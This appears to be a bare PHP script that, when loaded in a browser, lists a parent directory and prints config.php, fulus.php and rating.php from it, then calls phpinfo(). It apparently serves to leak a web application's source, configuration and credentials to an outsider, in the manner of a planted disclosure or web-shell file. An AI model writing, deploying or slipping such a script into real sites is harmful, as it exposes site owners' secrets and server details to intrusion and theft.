<?php

$dir = "../../";

$files1 = scandir($dir);

$dh  = opendir($dir);
while (false !== ($filename = readdir($dh))) {
    $files[] = $filename;
}

sort($files);

$results = print_r($files, true);
echo nl2br($results);

echo "<br />--------------------";
echo "--------------------";
echo "--------------------";
echo "--------------------";
echo "<br /><br /><br />";
echo "<br /><br /><br />";

$file = file_get_contents('../../config.php');
echo nl2br($file);

echo "<br />--------------------";
echo "--------------------";
echo "--------------------";
echo "--------------------";
echo "<br /><br /><br />";
echo "<br /><br /><br />";

$file = file_get_contents('../../fulus.php');
echo nl2br($file);

echo "<br />--------------------";
echo "--------------------";
echo "--------------------";
echo "--------------------";
echo "<br /><br /><br />";
echo "<br /><br /><br />";


$file = file_get_contents('../../rating.php');
echo nl2br($file);

echo "<br />--------------------";
echo "--------------------";
echo "--------------------";
echo "--------------------";
echo "<br /><br /><br />";
echo "<br /><br /><br />";


phpinfo();

?>